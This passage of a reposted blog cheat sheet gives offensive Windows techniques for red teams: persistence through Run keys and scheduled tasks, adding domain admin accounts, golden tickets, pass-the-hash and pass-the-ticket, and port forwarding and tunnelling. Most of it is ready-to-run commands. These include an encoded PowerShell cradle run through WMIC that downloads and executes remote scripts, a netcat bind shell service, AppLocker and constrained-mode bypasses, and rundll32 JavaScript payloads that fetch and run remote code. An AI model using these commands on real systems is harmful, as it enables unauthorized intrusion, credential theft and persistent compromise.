SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10.

execute-assembly &#x2F;root&#x2F;Toolkits&#x2F;SharpBinaries&#x2F;SharpDoor.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="AutoRun-Registry"><a href="#AutoRun-Registry" class="headerlink" title="AutoRun Registry"></a>AutoRun Registry</h4><pre class="line-numbers language-none"><code class="language-none">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Run-amp-Run-Once"><a href="#Run-amp-Run-Once" class="headerlink" title="Run &amp; Run Once"></a>Run &amp; Run Once</h4><pre class="line-numbers language-none"><code class="language-none">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; &#x2F;v WindowsUpdate
&#x2F;t REG_SZ &#x2F;d &quot;C:\Temp\SoftwareUpdate\Malware.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="Scheduled-Tasks-1"><a href="#Scheduled-Tasks-1" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h4><pre class="line-numbers language-none"><code class="language-none">#Note - Beaware. some EDR&#x2F;Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.

schtasks &#x2F;create &#x2F;sc minute &#x2F;mo 1 &#x2F;tn &quot;Malware&quot; &#x2F;tr C:\Temp\SoftwareUpdate\Malware.exe

This will run Malware.exe every minute forever.

# Run Malware.exe every day at 06:00am
schtasks &#x2F;create &#x2F;tn &quot;SoftwareUpdate&quot; &#x2F;tr C:\Temp\SoftwareUpdate\Malware.exe &#x2F;sc daily &#x2F;st 06:00

# Runs a task each time the user&#39;s session is idle for 5 minutes.
schtasks &#x2F;create &#x2F;tn &quot;SoftwareUpdate&quot; &#x2F;tr C:\Temp\SoftwareUpdate\Malware.exe &#x2F;sc onidle &#x2F;i 5

# Runs a a task as SYSTEM when User Logs in.
schtasks &#x2F;create &#x2F;ru &quot;NT AUTHORITY\SYSTEM&quot; &#x2F;rp &quot;&quot; &#x2F;tn &quot;SoftwareUpdate&quot; &#x2F;tr C:\Temp\SoftwareUpdate\Malware.exe &#x2F;sc onlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Windows-Startup-Folder"><a href="#Windows-Startup-Folder" class="headerlink" title="Windows Startup Folder"></a>Windows Startup Folder</h4><pre class="line-numbers language-none"><code class="language-none">This has been around for years as basically every version of Windows contains a startup folder. 

Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

Current User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="EXE-DLL-Hijacking"><a href="#EXE-DLL-Hijacking" class="headerlink" title="EXE/DLL Hijacking"></a>EXE/DLL Hijacking</h4><pre class="line-numbers language-none"><code class="language-none">Look for any missing DLL&#39;s or EXE&#39;s that common programs are calling on startup and over write them with your payload&#x2F;malware.

Also if you are localadmin&#x2F;system you could provide over write a normal service binary or DLL, providing you don&#39;t break the execution.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="Add-User-Account"><a href="#Add-User-Account" class="headerlink" title="Add User Account"></a>Add User Account</h4><pre class="line-numbers language-none"><code class="language-none">net user m0chan &#x2F;add &#x2F;domain
net group &quot;Domain Admins&quot; m0chan &#x2F;add &#x2F;domain
net localgroup &quot;Administrators&quot; &#x2F;add
net user m0chan &#x2F;domain &#x2F;comment:&quot;Your Blueteam Fucking Sucks&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Persistence-with-Kerberos"><a href="#Persistence-with-Kerberos" class="headerlink" title="Persistence with Kerberos"></a>Persistence with Kerberos</h4><pre class="line-numbers language-none"><code class="language-none">We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. 

They can be injected into session with mimikatz or Rebeus. 

But let&#39;s say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.

kerberos::golden &#x2F;user:utilisateur &#x2F;domain:chocolate.local &#x2F;sid:S-1-5-21-130452501-2365100805-3685010670 &#x2F;krbtgt:310b643c5316c8c3c70a10cfb17e2e31 &#x2F;ticket:utilisateur.chocolate.kirbi 

SID is the domain SID

Inject Ticket

kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

Can also inject kirbi with Rebeus<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><h4 id="Plink"><a href="#Plink" class="headerlink" title="Plink"></a>Plink</h4><pre class="line-numbers language-none"><code class="language-none">plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS

#Windows 1803 Built in SSH Client (By Default)

ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Powershell-Port-Forward"><a href="#Powershell-Port-Forward" class="headerlink" title="Powershell Port Forward"></a>Powershell Port Forward</h4><pre class="line-numbers language-none"><code class="language-none">netsh interface portproxy add v4tov4 listenport&#x3D;fromport listenaddress&#x3D;fromip connectport&#x3D;toport connectaddress&#x3D;toip

Permanent ^^

Requires iphlpsvc service to be enabled

fromport: the port number to listen on, e.g. 80
fromip: the ip address to listen on, e.g. 192.168.1.1
toport: the port number to forward to
toip: the ip address to forward to<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Invoke-SocksProxy"><a href="#Invoke-SocksProxy" class="headerlink" title="Invoke-SocksProxy"></a>Invoke-SocksProxy</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;p3nt4&#x2F;Invoke-SocksProxy&#x2F;

Local Socks4 Proxy on 1080

Import-Module .\Invoke-SocksProxy.psm1
Invoke-SocksProxy -bindPort 1080


Reverse Socks Proxy on Remote Machine Port 1080

# On the remote host: 
# Generate a private key and self signed cert
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem

# Get the certificate fingerprint to verify it:
openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d &quot;&#x3D;&quot; -f 2 | tr -d &quot;:&quot;

# Start the handler
python ReverseSocksProxyHandler.py 443 1080 .&#x2F;cert.pem .&#x2F;private.key

# On the local host:
Import-Module .\Invoke-SocksProxy.psm1
Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 

# Go through the system proxy:
Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy

# Validate certificate
Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint &#39;93061FDB30D69A435ACF96430744C5CC5473D44E&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Socat-for-Windows"><a href="#Socat-for-Windows" class="headerlink" title="Socat for Windows"></a>Socat for Windows</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;StudioEtrange&#x2F;socat-windows

Generate SSL Cert for Encryption
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key

Server : socat OPENSSL-LISTEN:443,cert&#x3D;&#x2F;cert.pem -
Client : socat - OPENSSL:localhost:443

#Port Forward

socat OPENSSL-LISTEN:443,cert&#x3D;&#x2F;cert.pem,fork TCP:202.54.1.5:443

All SSL Connections will be redirected to 202.54.1.5:443

#Non SSL Port Forward
socat TCP-LISTEN:80,fork TCP:202.54.1.5:80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SharpExec"><a href="#SharpExec" class="headerlink" title="SharpExec"></a>SharpExec</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;anthemtotheego&#x2F;SharpExec

C# Implementation of Conventional Lateral Movement Techniques, such as 

-WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket&#39;s wmiexec.py tool.

-SMBExec - Semi-Interactive shell that runs as NT Authority\System. Best described as a less mature version of Impacket&#39;s smbexec.py tool.

-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.

-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Secure-Sockets-Funneling"><a href="#Secure-Sockets-Funneling" class="headerlink" title="Secure Sockets Funneling"></a>Secure Sockets Funneling</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;0xdf.gitlab.io&#x2F;2019&#x2F;01&#x2F;28&#x2F;tunneling-with-chisel-and-ssf.html#ssf
#git clone https:&#x2F;&#x2F;github.com&#x2F;securesocketfunneling&#x2F;ssf.git

Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself. <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Chisel-Fast-TCP-Tunnel-over-HTTP-secured-by-SSH"><a href="#Chisel-Fast-TCP-Tunnel-over-HTTP-secured-by-SSH" class="headerlink" title="Chisel (Fast TCP Tunnel over HTTP secured by SSH)"></a>Chisel (Fast TCP Tunnel over HTTP secured by SSH)</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;0xdf.gitlab.io&#x2F;2019&#x2F;01&#x2F;28&#x2F;tunneling-with-chisel-and-ssf.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="CrackMapExec-1"><a href="#CrackMapExec-1" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;www.ivoidwarranties.tech&#x2F;posts&#x2F;pentesting-tuts&#x2F;cme&#x2F;crackmapexec-lateral-movement&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="WMIC-Spawn-Process"><a href="#WMIC-Spawn-Process" class="headerlink" title="WMIC Spawn Process"></a>WMIC Spawn Process</h4><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:WS02 &#x2F;user:DOMAIN\m0chan &#x2F;password:m0chan process call create &quot;powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA&#x3D;&#x3D;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="WinRS"><a href="#WinRS" class="headerlink" title="WinRS"></a>WinRS</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows-server&#x2F;administration&#x2F;windows-commands&#x2F;winrs

winrs [&#x2F;&lt;parameter&gt;[:&lt;value&gt;]] &lt;command&gt;  

winrs &#x2F;r:https:&#x2F;&#x2F;contoso.com command

winrs &#x2F;r:http:&#x2F;&#x2F;[1080:0:0:0:8:800:200C:417A]:80 command  

winrs &#x2F;r:myserver &#x2F;ad &#x2F;u:administrator &#x2F;p:$%fgh7 dir \\anotherserver\share<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Invoke-WMIExec-ps1"><a href="#Invoke-WMIExec-ps1" class="headerlink" title="Invoke-WMIExec.ps1"></a>Invoke-WMIExec.ps1</h4><pre class="line-numbers language-none"><code class="language-none">Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d
7b832fa -Command &quot;net user user pass &#x2F;add &#x2F;domain&quot;

PS C:\users\user\Downloads&gt; Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d
7b832fa -Command &quot;net group &quot;&quot;Domain Admins&quot;&quot; m0chan &#x2F;add &#x2F;domain&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Powershell-Invoke-Command-Requires-Port-5985"><a href="#Powershell-Invoke-Command-Requires-Port-5985" class="headerlink" title="Powershell Invoke-Command (Requires Port 5985)"></a>Powershell Invoke-Command (Requires Port 5985)</h4><pre class="line-numbers language-none"><code class="language-none">$secpasswd &#x3D; ConvertTo-SecureString &#39;pass&#39; -AsPlainText -Force
$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;m0chan\user&#39;, $secpasswd)

Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock &#123;whoami&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="PSExec"><a href="#PSExec" class="headerlink" title="PSExec"></a>PSExec</h4><pre class="line-numbers language-none"><code class="language-none">psexec.exe \\dc01.m0chanAD.local cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Powershell-Remoting"><a href="#Powershell-Remoting" class="headerlink" title="Powershell Remoting"></a>Powershell Remoting</h4><pre class="line-numbers language-none"><code class="language-none">$secpasswd &#x3D; ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force
$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;WS02\USER&#39;, $secpasswd)

$Session &#x3D; New-PSSession -ComputerName FileServer -Credential $cred
Enter-PSSession $Session<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Configure-Remote-Service-over-SMB-Requires-Local-Admin-on-Target-Machine"><a href="#Configure-Remote-Service-over-SMB-Requires-Local-Admin-on-Target-Machine" class="headerlink" title="Configure Remote Service over SMB (Requires Local Admin on Target Machine)"></a>Configure Remote Service over SMB (Requires Local Admin on Target Machine)</h4><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.0.15 [password] &#x2F;u:DOMAIN\m0chan

sc \\192.168.0.15 create &lt;service_name&gt; binpath&#x3D; &quot;cmd.exe &#x2F;k COMMAND&quot;
sc \\192.168.0.15 create &lt;service_name&gt; binpath&#x3D; &quot;cmd.exe &#x2F;k &lt;c:\tools\nc.exe -L -p &lt;port&gt; -e cmd.exe&gt;&quot;
sc \\192.168.0.15 start &lt;service_name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass-The-Hash"></a>Pass-The-Hash</h4><pre class="line-numbers language-none"><code class="language-none">crackmapexec &lt;ip&gt; -u &lt;user&gt; -H &quot;&lt;lm&gt;&quot; -x &quot;&lt;msfvenom psh-cmd&gt;&quot;

impacket-wmiexec &lt;user&gt;@&lt;ip&gt; -hashes &lt;lm:nt&gt;

pth-winexe -U &lt;user&gt;%&lt;ntlm&gt; &#x2F;&#x2F;&lt;ip&gt; &quot;&lt;msfvenom psh-cmd&gt;&quot;

python wmiexec.py -hashes :&lt;hash&gt; &lt;user&gt;@&lt;ip&gt;

xfreerdp &#x2F;u:&lt;user&gt; &#x2F;d:&lt;domain&gt; &#x2F;pth:&lt;ntlm&gt; &#x2F;v:&lt;ip&gt;:3389 &#x2F;dynamic-resolution

sekurlsa::pth &#x2F;user:Administrateur &#x2F;domain:chocolate.local &#x2F;ntlm:cc36cf7a8514893efccd332446158b1a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h4><pre class="line-numbers language-none"><code class="language-none">#Check my Blog Post Kerberos Attacks in Depth for Further Information

Rebeus monitor &#x2F;interval:30 

Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets

Reubus will now give you a Kerberos ticket in base64 which you can pass with

Rubeus.exe ptt &#x2F;ticket:[base64blobhere]

We can now request TGS service tickets to access network resources as this user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Obfuscation-Evasion-Techniques"><a href="#Obfuscation-Evasion-Techniques" class="headerlink" title="Obfuscation / Evasion Techniques"></a>Obfuscation / Evasion Techniques</h2><h4 id="Invoke-Obfusaction"><a href="#Invoke-Obfusaction" class="headerlink" title="Invoke-Obfusaction"></a>Invoke-Obfusaction</h4><pre class="line-numbers language-powershell.exe" data-language="powershell.exe"><code class="language-powershell.exe">#https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-Obfuscation

Can obfusacte Scripts &amp; Commands 

Obfusacte script from remote url 

SET SCRIPTPATH https:&#x2F;&#x2F;thisdosentexist.m0chan.com&#x2F;Invoke-Mimikatz.ps1

Can also set Sscript block base64 PS

SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Invoke-CradleCraft"><a href="#Invoke-CradleCraft" class="headerlink" title="Invoke-CradleCraft"></a>Invoke-CradleCraft</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-CradleCrafter

Similar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i&#x2F;e

IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;c2server.com&#x2F;Invoke-Mimikatz.ps1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Invoke-DOSfuscation"><a href="#Invoke-DOSfuscation" class="headerlink" title="Invoke-DOSfuscation"></a>Invoke-DOSfuscation</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-DOSfuscation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h4><p><a target="_blank" rel="noopener" href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a></p>
<pre class="line-numbers language-none"><code class="language-none">unicorn.py Nishang.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="AppLocker-Constrained-Mode-Bypasses"><a href="#AppLocker-Constrained-Mode-Bypasses" class="headerlink" title="AppLocker / Constrained Mode Bypasses"></a>AppLocker / Constrained Mode Bypasses</h2><h4 id="Verify-is-you-are-in-constrained-mode"><a href="#Verify-is-you-are-in-constrained-mode" class="headerlink" title="Verify is you are in constrained mode"></a>Verify is you are in constrained mode</h4><pre class="line-numbers language-none"><code class="language-none">$ExecutionContext.SessionState.LanguageMode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="PowershellVeryLess-Bypass"><a href="#PowershellVeryLess-Bypass" class="headerlink" title="PowershellVeryLess Bypass"></a>PowershellVeryLess Bypass</h4><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;decoder-it&#x2F;powershellveryless.git


C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe &#x2F;reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll 
&#x2F;out:C:\Users\m0chan\Scripts\powershellveryless.exe 



C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe &#x2F;reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll &#x2F;out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.cs


Execute -&gt; powershellveryless.exe script.ps1

script.ps1 &#x3D; Script of your Choice<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="World-Writable-Folders-By-Default-on-Windows-10-1803"><a href="#World-Writable-Folders-By-Default-on-Windows-10-1803" class="headerlink" title="World Writable Folders (By Default on Windows 10 1803)"></a>World Writable Folders (By Default on Windows 10 1803)</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;api0cradle&#x2F;UltimateAppLockerByPassList&#x2F;blob&#x2F;master&#x2F;Generic-AppLockerbypasses.md

C:\Windows\Tasks 
C:\Windows\Temp 
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Downgrade-Attack"><a href="#Downgrade-Attack" class="headerlink" title="Downgrade Attack"></a>Downgrade Attack</h4><pre class="line-numbers language-none"><code class="language-none">Downgrading to PS Version 2 circumvates Constrained Mode

powershell.exe -version 2

Verifiy versions with $PSVersionTable
Get-Host<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="AppLocker-COR-Profile-Bypass"><a href="#AppLocker-COR-Profile-Bypass" class="headerlink" title="AppLocker COR Profile Bypass"></a>AppLocker COR Profile Bypass</h4><pre class="line-numbers language-none"><code class="language-none">set COR_ENABLE_PROFILING&#x3D;1
COR_PROFILER&#x3D;&#123;cf0d821e-299b-5307-a3d8-b283c03916db&#125;
set COR_PROFILER_PATH&#x3D;C:\Users\m0chan\pwn\reverseshell.dll
tzsync
powershell

Where .DLL is your payload i&#x2F;e reverse shell, beacon etc. <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="MSBuild-Powershell-CMD-Bypass"><a href="#MSBuild-Powershell-CMD-Bypass" class="headerlink" title="MSBuild Powershell/CMD Bypass"></a>MSBuild Powershell/CMD Bypass</h4><pre class="line-numbers language-none"><code class="language-none">You can use this if cmd is not disabled but powershell is

https:&#x2F;&#x2F;github.com&#x2F;Cn33liz&#x2F;MSBuildShell&#x2F;blob&#x2F;master&#x2F;MSBuildShell.csproj

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe pshell.csproj

Also https:&#x2F;&#x2F;gist.github.com&#x2F;NickTyrer&#x2F;92344766f1d4d48b15687e5e4bf6f93c

MSBuild PSAttack :D :D <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="PSAttack"><a href="#PSAttack" class="headerlink" title="PSAttack"></a>PSAttack</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;jaredhaight&#x2F;PSAttack

Use if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc.

Has numerous modules prebuilt in and is built in C Sharp &#x2F; .NET so can be reflectively loaded :)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="NoPowerShell"><a href="#NoPowerShell" class="headerlink" title="NoPowerShell"></a>NoPowerShell</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;nopowershell

Primiarily to be used with Cobalt &amp; Execute Assembly but can also be reflectively loaded from any other C2 infra.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="runDLL32-Bypass"><a href="#runDLL32-Bypass" class="headerlink" title="runDLL32 Bypass"></a>runDLL32 Bypass</h4><pre class="line-numbers language-none"><code class="language-none">#Reference: https:&#x2F;&#x2F;oddvar.moe&#x2F;2017&#x2F;12&#x2F;13&#x2F;applocker-case-study-how-insecure-is-it-really-part-1&#x2F;

rundll32.exe is a .exe found on all Windows based systems located at C:\Windows\system32\rundll32.exe

rundll32 shell32.dll,Control_RunDLL payload.dll

rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &lt;HTML Code&gt;

rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;);&quot;

rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w&#x3D;new%20ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;calc\&quot;);window.close()&quot;);

rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b&#x3D;h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im rundll32.exe&quot;,0,true);&#125;

rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;Javascript-Backdoor&#x2F;master&#x2F;test&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
          </div>
          <br><br>
              
                <div class="license-wrapper">
                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
                    <p>原文链接：<a href="https://misakikata.github.io/2019/10/Windows-Notes/">https://misakikata.github.io/2019/10/Windows-Notes/</a>
                    <p>发表日期：<a href="https://misakikata.github.io/2019/10/Windows-Notes/">October 11th 2019, 10:11:47 am</a>
